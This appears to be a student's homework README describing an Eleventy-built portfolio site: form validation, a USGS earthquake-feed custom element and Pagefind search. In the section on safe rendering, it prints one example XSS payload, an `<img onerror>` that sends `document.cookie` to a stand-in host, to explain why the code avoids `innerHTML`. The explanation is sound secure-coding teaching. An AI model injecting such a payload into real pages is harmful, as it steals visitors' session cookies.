# CSE 134B — HW5

So this one's a big glow-up from HW2. Back then it was nine hand-maintained pages with copy-pasted headers and footers. Now it's an Eleventy build — Netlify pulls the source and generates the whole site fresh on every push.

One URL, three deliverables riding together:

| Part         | What                                                                              |
| ------------ | --------------------------------------------------------------------------------- |
| 1            | Progressive enhancement — **Option B**, contact form validation + error reporting |
| 2            | `<quake-feed>`, a custom element pulling live data from the USGS earthquake feed  |
| 3            | Eleventy static site generation, deployed straight from source                    |
| Extra credit | Pagefind full-text search                                                         |

**Deployed site:** <https://prismatic-brioche-89657d.netlify.app>
(also sitting in `deployed-url.json` if you need it programmatically). Netlify rebuilds from this repo on every push to `main` — nothing gets uploaded by hand.

---

## Local setup

```bash
npm install     # Eleventy 3 + Pagefind, that's it, no runtime deps
npm run dev     # dev server with hot reload → http://localhost:8080
npm run build   # real build: Eleventy writes _site/, then Pagefind indexes it
npm run clean   # wipes _site/
```

`npm install && npm run build` on a fresh checkout gets you the whole site in `_site/`. That folder's gitignored on purpose — Netlify builds it, so there's nothing to check in.

Heads up though: `npm run dev` only runs Eleventy, so there's no `/pagefind/` yet and the search page will tell you the index isn't there. If you want to actually try search locally, run `npm run build` and serve `_site/` instead.

---

## Part 1 — Progressive enhancement (Option B: form validation)

### The no-JS baseline

Here's the thing about progressive enhancement — you're supposed to build the base layer so it just _works_, then layer stuff on top of it, rather than building for JS and hoping it degrades gracefully if something breaks. So the contact form at `/contact/` leans entirely on native constraint validation for its baseline. Kill JavaScript and it's still completely usable — the browser itself blocks a bad submission, tells the user what's wrong, and the stylesheet colors the fields accordingly.

| Field     | Constraints                                                                       |
| --------- | --------------------------------------------------------------------------------- |
| `name`    | `required` `minlength="2"` `maxlength="60"` `pattern="[\p{L}\p{M}'. -]+"` `title` |
| `email`   | `type="email"` `required` `maxlength="254"` `title`                               |
| `subject` | `required` `minlength="3"` `maxlength="100"` `title`                              |
| `message` | `required` `minlength="20"` `maxlength="1000"` `title`                            |

The baseline feedback is pure CSS, no scripting involved at this layer:

```css
:is(input, textarea):user-invalid {
  border-color: var(--color-danger);
}
:is(input, textarea):user-valid {
  border-color: var(--color-success);
}
```

I went with `:user-invalid` instead of plain `:invalid` deliberately — it only lights up once someone's actually touched the field, so you don't land on the page and immediately see a wall of red on an empty form.

### What the JS layer adds on top

That's `src/js/form-validation.js` — an external ES module, loaded with `<script type="module">`. No inline handlers, no libraries, no polyfills, keeping it in line with the minimalism/least-dependencies mindset.

- It reads each control's `validity` object and drops a specific message into the `<output>` tied to that field. `valueMissing`, `typeMismatch`, `patternMismatch`, `tooShort`, and `tooLong` all get their own wording; anything else just falls back to `control.validationMessage`.
- Each `<output>` is wired up through `aria-describedby` on its control and carries `aria-live="polite"`, so screen readers get told about the change without focus getting yanked around.
- If a submission fails, a summary reports how many fields still need attention and focus moves to the first bad one, in tree order.
- Validation also fires on `blur`, so you find out about a problem when you leave a field, not just when you slam Send. Blur checks intentionally don't move focus — doing that would trap you in one field forever.
- Every error gets pushed into an array and serialized into a hidden `name="form-errors"` input that rides along with the submission:

```json
[
  {
    "field": "email",
    "type": "typeMismatch",
    "message": "Enter an email address in the form name@example.com.",
    "timestamp": "2026-08-03T02:21:16.003Z"
  }
]
```

With JS off, that field just submits as `[]`.

### One deliberate deviation

I never set `novalidate` — native validation stays fully active the whole time. What the script _does_ do is call `preventDefault()` on the `invalid` event, but only to suppress the browser's own generic error bubble (the "Please fill out this field" popup), since a more specific message is already sitting right there in the `<output>`. The constraint itself never gets touched — the form still refuses to submit no matter what.

Side effect of cancelling every `invalid` event: you also cancel the browser's built-in "focus the first invalid field" behavior, so the script has to take that over manually. All the `invalid` events from one submit attempt fire within a single task, so rather than reacting to each one as it comes in, the handler batches them and flushes once via `setTimeout(…, 0)`.

### Where it actually goes

On the deployed site the form posts to Netlify Forms (`data-netlify="true"`, plus a honeypot field), so `form-errors` has somewhere real to land, and a successful submit redirects to `/contact/success/`. Locally the constraints still all work fine — the submission just has nowhere to go.

---

## Part 2 — `<quake-feed>`

A custom element that grabs recent earthquake data from the USGS and renders it as a list. It's live on the home page and shows up again on `/experiments/` with different attributes, just to show it's actually reusable and not a one-off.

### Reference

**Tag name:** `quake-feed`

| Attribute   | Default | Accepted values                           | Effect                                      |
| ----------- | ------- | ----------------------------------------- | ------------------------------------------- |
| `magnitude` | `2.5`   | `all`, `1.0`, `2.5`, `4.5`, `significant` | Minimum magnitude band pulled from the feed |
| `period`    | `day`   | `hour`, `day`, `week`                     | How far back it looks                       |
| `count`     | `5`     | integer `1`–`20`                          | How many quakes get rendered                |

All three attributes are in `observedAttributes`, so tweaking any of them live in DevTools triggers a refetch and re-render you can actually watch happen. Bad values don't throw — they just fall back to the default, so `magnitude="bogus"` quietly renders the 2.5 feed instead of blowing up.

**Endpoint:**

```
https://earthquake.usgs.gov/earthquakes/feed/v1.0/summary/{magnitude}_{period}.geojson
```

No key needed, it's public domain data, and it ships `access-control-allow-origin: *`. There's no credential anywhere in the client code because there just isn't one to have — nothing to leak, no proxy needed to hide anything.

**Usage:**

```html
<script type="module" src="/js/quake-feed.js"></script>

<quake-feed magnitude="4.5" period="week" count="10">
  <p>
    Recent earthquake data is loaded from the U.S. Geological Survey and needs
    JavaScript to display. The same feed is browsable at
    <a href="https://earthquake.usgs.gov/earthquakes/map/"
      >earthquake.usgs.gov</a
    >.
  </p>
</quake-feed>
```

Whatever sits between the tags is the fallback content. Since the element uses the light DOM, that fallback renders totally normally right up until the element upgrades and swaps it out — so if the script gets blocked, fails to parse, or just never shows up, the reader still gets a real sentence and a working link instead of an empty box.

### States

The element reflects where it's at in its lifecycle through `data-state`, and the stylesheet handles every visual difference — the script itself never touches inline styles.

| `data-state` | When                                                                    |
| ------------ | ----------------------------------------------------------------------- |
| `idle`       | Shell's built, no request started yet                                   |
| `loading`    | Request in flight — animated indicator, `aria-busy="true"`              |
| `ready`      | Results rendered as an ordered list                                     |
| `empty`      | Request succeeded but there were no quakes for that query               |
| `error`      | Request failed or timed out — error message plus a **Try again** button |

`.quake-status` carries `role="status"`, so every transition gets announced politely rather than silently.

### Lifecycle and teardown

- `connectedCallback` builds the shell on first connect, wires up the retry button, and kicks off the request.
- `disconnectedCallback` aborts any in-flight request through an `AbortController` and tears down the DOM listeners through a second one.
- `attributeChangedCallback` cancels whatever's pending and reloads. It bails out early during upgrade — since it actually fires _before_ `connectedCallback` — so a normal page load only ever fires one request, not two.
- There's an 8-second timeout so a hung network request can't leave the widget spinning forever. A timeout and a disconnect are treated differently on purpose — only the timeout shows an error state.

### Rendering safely — why not `innerHTML`

Every list item gets cloned from a `<template>` and filled in using `textContent` and `setAttribute`. Nothing that comes back from the network ever gets concatenated straight into an HTML string — this is basically the security half of "work with the grain of the platform" instead of fighting it.

The risk here isn't hypothetical. USGS `place` values are free text. If the render path looked like:

```js
list.innerHTML += `<li>${quake.properties.place}</li>`; // never do this
```

then a `place` value of `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">` would get parsed as actual markup and execute in the page's own origin. Run through `textContent`, that exact same string is completely inert — it just shows up as visible characters on the page.

The only two things in the module that ever get assigned via `innerHTML` are the two `<template>` elements, and both are static hand-written markup with zero interpolation.

Event URLs get one more check on top: an `href` only gets installed if the URL starts with `https://earthquake.usgs.gov/`. Without that check, a corrupted feed handing back a `javascript:` URL could turn into a live, clickable exploit. If the check fails, the anchor just gets swapped for plain text instead.

### Caching and rate limits

Successful responses get cached in `sessionStorage` keyed by the feed URL with a five-minute TTL, so reloading during dev doesn't hammer a free public API for no reason. Storage access is wrapped defensively — private browsing, disabled storage, quota errors, all of that just degrades to "no cache" instead of breaking the widget outright.

USGS attribution shows up in the widget itself, since their terms ask for that.

---

## Part 3 — Static site generation

**Eleventy 3.1.6**, configured in `eleventy.config.js`. Source lives in `src/`, output goes to `_site/`.

### Structure

```
src/
  _data/site.js              global data: title, author, nav, social links, year
  _includes/
    layouts/base.njk         the document shell — doctype, head, skip link, wrapper
    layouts/page.njk         thin wrapper over base
    layouts/project.njk      the single template behind every case study
    partials/head.njk        title, description, canonical, stylesheet, scripts
    partials/site-header.njk logo, primary navigation
    partials/site-footer.njk copyright and footer navigation
  projects/                  the collection's source of truth
    trailmate.md
    pixelsort-visualizer.md
    studygroup-finder.md
    projects.11tydata.json   layout, tag, and permalink for the whole directory
  css/styles.css
  js/form-validation.js  js/quake-feed.js  js/site-search.js
  assets/
  index.njk about.njk projects.njk experience.njk contact.njk experiments.njk
  search.njk all.njk 404.njk sitemap.njk contact-success.njk
```

### Base layout and shared includes

`layouts/base.njk` owns the `<!DOCTYPE>`, `<html>`, the head, the skip link, and the page wrapper. Three includes get reused across literally every page — the head/metadata partial, the header with nav, and the footer. The footer markup now exists in exactly one file, whereas before conversion it was pasted into all nine pages separately. That's the whole point of separation of concerns paying off here — one change, one place.

### Global data

`src/_data/site.js` defines the site title, author, email, canonical URL, nav items, and social links exactly once. It's a `.js` data file instead of JSON specifically so the copyright year gets computed at build time and never goes stale. No template anywhere hard-codes these values.

### The data-driven collection

Each case study is just a Markdown file in `src/projects/`, with front matter for title, description, summary, stack, image, and repo link. `projects.11tydata.json` applies the layout, tag, and permalink pattern across the whole directory, and there's a sorted `projects` collection declared in `eleventy.config.js`.

Three pages, one template. Add a fourth project and the case-study page, the projects index, the home page grid, `sitemap.xml`, and `/all/` all update automatically with zero template edits, because they're all reading off the same collection.

### Build-time navigation state

`partials/site-header.njk` compares `page.url` against each entry in `site.nav`:

- exact match → `aria-current="page"`
- section ancestor (like Projects while you're on a case study) → `aria-current="true"`

None of this runs in the browser — it's all resolved at build time. `aria-current="page"` is strictly for the page you're actually standing on; a case study is inside the Projects section but isn't _the_ Projects page itself, which is exactly what `true` is for.

### Generated 404 and sitemap

`src/404.njk` builds out to `/404.html`, which Netlify picks up automatically on a miss. `src/sitemap.njk` builds `/sitemap.xml` off `collections.all`, so every page shows up with its `lastmod` — and the sitemap, the 404 page, and the form success page all exclude themselves from their own listing.

Per-page `<title>` and `<meta name="description">` both come straight from front matter through the head partial.

### Deployment

`netlify.toml` is committed with the build command, publish directory, and Node version all spelled out, so nothing depends on settings someone typed into a dashboard once and forgot about:

```toml
[build]
  command = "npm run build"
  publish = "_site"
```

`.gitignore` excludes `_site/`, `node_modules/`, and `.env*`. Only source gets committed — a push to GitHub is what actually triggers the Netlify build.

---

## Extra credit — Pagefind

Wired directly into the build script so the deployed site indexes itself on every single deploy:

```json
"build": "eleventy && pagefind --site _site"
```

Nothing's hand-run, and no index ever gets committed to the repo.

**What it actually builds.** Pagefind runs _after_ Eleventy, over the generated HTML rather than the source files. It reads each page, grabs whatever's inside `data-pagefind-body`, and writes a static index into `_site/pagefind/`: a small top-level metadata file, index chunks grouped by term, and one compressed content fragment per page — plus a WebAssembly search engine and the JS API module to run it.

**Roughly how big.** On this site that's 9 indexed pages and about 530 words, which turns into an 8 KB index directory and 36 KB of page fragments. Add the 72 KB WASM engine and 48 KB API module, and someone who actually searches downloads about 165 KB total — someone who never hits `/search/` downloads none of it. The bundled Pagefind UI also gets emitted during the build, but this site doesn't actually load it.

**Why it doesn't need a search server.** The whole index is just static files. The API asks for the metadata file, figures out which index chunks a given query touches, requests only those, then fetches content fragments just for the pages that actually match. All the matching logic runs in WebAssembly, client-side. Since a query never grows past a handful of small range requests, a plain CDN serving static files is the entire backend — nothing to run, nothing to scale, nothing to keep online, and no query data ever leaves the reader's machine.

**Scoping.** `<main>` carries `data-pagefind-body`; header and footer both carry `data-pagefind-ignore`. Skip that and every page on the site would match a search for "GitHub" just because of the footer link. The search page itself, `/all/`, the 404 page, and the form success page all opt out entirely via a `pagefind: false` front matter flag that the base layout understands.

**The interface.** `/search/` talks to the Pagefind JavaScript API directly rather than using the bundled UI, so it actually matches the rest of the site's design. It's a real `<form>` with a labelled `<input type="search">`, fully keyboard operable, results announced through a `role="status"` region. Queries are debounced, and `/search/?q=canvas` runs automatically on load so a search result is linkable and shareable. Excerpts come back from Pagefind as HTML strings containing `<mark>` — instead of dumping those into `innerHTML`, the script splits them apart and rebuilds real text nodes and `<mark>` elements by hand.

Search does need JavaScript, and the page's honest about that — a `<noscript>` block explains why and links to `/all/`, a plain browsable listing of every page, built off the exact same collection as the sitemap.

---

## Reflection

**What the conversion actually got rid of.** Nine copies of the same document shell. Every HW2 page had its own doctype, head, header, nav list, and footer, and the nav itself was repeated nine separate times with `aria-current` set by hand each time — exactly the kind of duplication where a typo in one copy stays invisible until someone happens to land on that one page. Adding a nav item used to mean nine edits; now it's one line in `site.js`. The three case studies went from three near-identical files down to three Markdown files and a single template, and the projects index doesn't restate what those pages already say anymore.

**What it cost to get there.** A build step and a `node_modules/` folder, where before the files on disk _were_ the site, full stop. You can't just pop open a source file in a browser and see the page anymore — the source is templates now, and what you actually look at is generated. Debugging picks up a layer too: one stray character in a partial can break eleven pages at once, which is exactly why the deployed markup got run through a validator instead of just trusted. And there's a tool to learn — Eleventy's data cascade isn't huge, but it's still one more thing you have to know that plain HTML never asked for.

**Where I wouldn't reach for an SSG.** Anything where the content is genuinely per-request. A dashboard showing someone's own data, a page whose content depends on who's logged in, or a view that has to reflect a database as of _this second_ — all of that fights the model, because the entire premise of an SSG is that the HTML gets decided once at build time and handed out identically to everyone. The earthquake widget on the home page is basically the honest exception that proves the rule: that content genuinely changes minute to minute, so it's fetched client-side instead of baked in — which also means it's the one part of the site that stops working the moment JavaScript does, and that's exactly why it ships with real fallback content while nothing else on the site needs to.

---

## Carry-forward notes

- **Validation.** All thirteen _deployed_ pages passed the Nu HTML Checker by URL with zero errors and zero warnings, including all three pages generated off the collection template. `styles.css` comes back clean from the W3C CSS validator too (aside from the standard "CSS variables aren't statically checked" notice, which is expected).
- **CSS.** HW2 didn't really have a stylesheet — three lines of debug borders, honestly — so the responsive CSS here is written fresh: custom-property tokens, `color-scheme` with a `prefers-color-scheme` override, `clamp()` for fluid type, relative units throughout, and `auto-fit` grids that reflow without needing breakpoints. Selectors stay on elements and attributes rather than getting stacked into class soup.
- **No frameworks.** No CSS framework, no JS framework, no utility library, no polyfills. Pagefind is the one dependency actually shipped to the browser — which the assignment allows — and even then only on the search page.
- **Three HW2 bugs got fixed along the way, not just carried forward:** a case study was pointing at an image path that didn't exist; the hero's "View Projects" and "Résumé" controls used to be `<button>` elements wired to nothing and are now proper links; and a dead third-party analytics script, a demo `<iframe>` pointing nowhere, and an inline canvas script all got removed — leaving Parts 1 and 2 as the only JavaScript actually shipped to the browser.
